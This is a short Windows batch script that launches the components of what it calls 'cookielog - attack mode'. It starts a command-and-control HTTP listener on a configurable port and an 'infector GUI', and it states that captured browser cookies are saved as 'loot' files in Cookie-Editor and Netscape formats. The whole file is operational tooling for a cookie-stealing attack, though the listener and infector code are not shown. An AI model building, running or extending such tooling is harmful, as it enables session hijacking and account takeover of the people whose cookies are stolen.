@echo off
REM start_attack.bat - starts the HTTP listener and the infector GUI
REM Usage: start_attack.bat [c2_port]

set PORT=%1
if "%PORT%"=="" set PORT=9090

echo [*] cookielog - attack mode
echo [*] starting listener on port %PORT%...
echo [*] cookies go to loot\cookies.json (Cookie-Editor) + loot\cookies.txt (Netscape)
echo.

start "cookielog listener" cmd /k "python listen.py %PORT%"
timeout /t 2 /nobreak >nul
python pick.py
